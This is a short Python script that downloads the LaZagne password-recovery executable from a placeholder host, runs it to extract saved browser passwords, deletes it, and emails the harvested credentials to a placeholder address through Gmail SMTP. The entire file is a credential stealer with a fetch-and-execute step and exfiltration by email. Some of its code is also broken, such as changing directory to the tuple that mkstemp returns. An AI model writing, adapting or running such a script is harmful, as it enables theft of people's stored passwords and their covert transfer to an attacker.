import smtplib
import subprocess
import requests
import tempfile
import os
from email.mime.text import MIMEText

def run_command(command):
    output_command = subprocess.check_output(command, shell=True)
    return output_command.decode('cp850')

def send_email(subject, body, sender, recipients, password):
    msg = MIMEText(body)
    msg['Subject'] = subject
    msg['From'] = sender
    msg['To'] = ', '.join(recipients)

    with smtplib.SMTP('smtp.gmail.com', 465) as smtp_server:
        smtp_server.login(sender, password)
        smtp_server.sendmail(sender, recipients, msg.as_string())

    print(f'\n[+] Email sent successfully!\n')

def download_and_execute_lazagne():
    r = requests.get("http://<IP>/laZagne.exe")
    temp_file = tempfile.mkstemp()
    os.chdir(temp_file)

    with open("laZagne.exe", "wb") as f:
        f.write(r.content)

    output = run_command("laZagne.exe browsers")
    os.remove("laZagne.exe")
    return output

if __name__ == '__main__':
    output_lazagne = download_and_execute_lazagne()
    send_email("LaZagne Info", output_lazagne, "<EMAIL>", ["<EMAIL>"], "<PASSWORD>")